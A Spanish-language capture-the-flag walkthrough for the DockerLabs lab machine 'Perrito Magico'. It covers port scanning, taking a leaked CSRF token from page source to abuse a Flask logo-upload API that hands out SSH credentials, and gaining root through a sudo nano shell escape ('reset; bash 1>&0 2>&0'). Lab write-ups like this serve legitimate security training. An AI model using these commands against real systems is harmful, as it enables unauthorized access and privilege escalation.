---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Perrito Magico DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip perrito_magico.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh perrito_magico.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 20:21 CET
Nmap scan report for 172.17.0.2
Host is up (0.000074s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2f:ac:77:fd:4c:70:48:5d:c2:6a:a5:0a:07:fd:5a:5a (ECDSA)
|_  256 ea:5e:b4:b7:94:d9:2a:76:c9:d6:9a:1e:d7:a7:4e:29 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.1.4 (Python 3.12.3)
| http-title: BunkerLabs
|_Requested resource was /bunkerlabs
|_http-server-header: Werkzeug/3.1.4 Python/3.12.3
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
```

Veremos que hay un puerto `5000`, esto nos da que pensar de que hay una web de `python3` con tecnologia `Flask` alojada en dicho puerto, por lo que posiblemente tenga la funcion tipica de `APIs` para poder descubrir cosas, si entramos dentro...

```
URL = http://<IP>:5000/
```

Veremos que nos carga una web parecida a la de `Dockerlabs`, pero vamos a probar a poner `/api` directamente ya que generalmente los servidores de `python3` con `Flask` lo suelen llevar asociados.

```
URL = http://<IP>:5000/api
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-03 202721.png" alt=""><figcaption></figcaption></figure>

Veremos varias cosas interesantes, nos carga una pagina aparte dentro de esta ruta con bastante informacion, si analizamos un poco toda esta info veremos que se puede llamar a la `API` de `/gestion-maquinas/upload-logo` para poder modificar la foto de una maquina, pero si lanzamos un `curl` veremos lo siguiente:

## Escalate user balulerobalulito

### Explotacion cambio de logo maquina

```shell
curl -s -X POST "http://<IP>:5000/gestion-maquinas/upload-logo"
```

Info:

```
{"error":"CSRF token missing"}
```

Vemos que requiere de un `TOKEN`, esta protegido por esa autenticacion, pero como podemos acceder a la `api` vamos a dumpearnos la pagina entera a nivel de codigo y grepear por el nombre `csrf_token` para ver si esta filtrado.

```shell
curl -s "http://<IP>:5000/gestion-maquinas" \
  -H "Cookie: session=<TOKEN_JWT_SESSION>" | grep -E 'csrf|token|_token' -i
```

Info:

```html
<meta name="csrf-token" content="965fc33763c62d1967c4503a8a3fa2b2db6d256f5976cfe4139389a781df5d7d">
        function getCsrfToken() {
            const meta = document.querySelector('meta[name="csrf-token"]');
        formData.append('csrf_token', getCsrfToken());
```

Veremos el `content` bastante interesante y es que estamos viendo explicitamente el `TOKEN` que requerimos para poder enviar la peticion de la `API` de forma correcta.

```shell
curl -X POST "http://<IP>:5000/gestion-maquinas/upload-logo" \
  -H "Cookie: session=<TOKEN_JWT_SESSION>" \
  -H "X-CSRFToken: 965fc33763c62d1967c4503a8a3fa2b2db6d256f5976cfe4139389a781df5d7d" \
  -F "machine_id=1" \
  -F "origen=bunker" \
  -F "logo=@test.jpg" # Tu logo
```

Info:

```
{"exploit_message":"Enhorabuena, has conseguido explotar la vulnerabilidad de la API, que permite cambiar la imagen del logo de la maquina a usuarios con rol de usuario. Ahora puedes entrar por SSH con las credenciales: balulerobalulito:megapassword","exploit_triggered":true,"filename":"Dockerlabs-Weak.png","image_path":"logos-bunkerlabs/Dockerlabs-Weak.png","message":"Logo subido correctamente"}
```

Veremos que ha funcionado, por lo que vamos a conectarnos por `SSH` con estas credenciales.

### SSH

```shell
ssh balulerobalulito@<IP>
```

Metemos como contraseña `megapassword`...

```
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

balulerobalulito@ce40d064de7c:~$ whoami
balulerobalulito
```

Veremos que hemos accedido de forma correcta.

## Escalate Privileges

Si ejecutamos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for balulerobalulito on ce40d064de7c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User balulerobalulito may run the following commands on ce40d064de7c:
    (ALL) NOPASSWD: /usr/bin/nano
```

Vemos que podemos ejecutar `nano` como el usuario `root`, esto es una vulnerabilidad muy critica, ya que podremos ser `root` con este comando.

```shell
sudo nano
^R^X # Pulsamos las teclas mencionadas para ejecutar comandos
reset; bash 1>&0 2>&0
```

Info:

```
root@ce40d064de7c:/home/balulerobalulito# whoami
root
```

Veremos que con esto ya seremos `root`, por lo que habremos terminado la maquina.
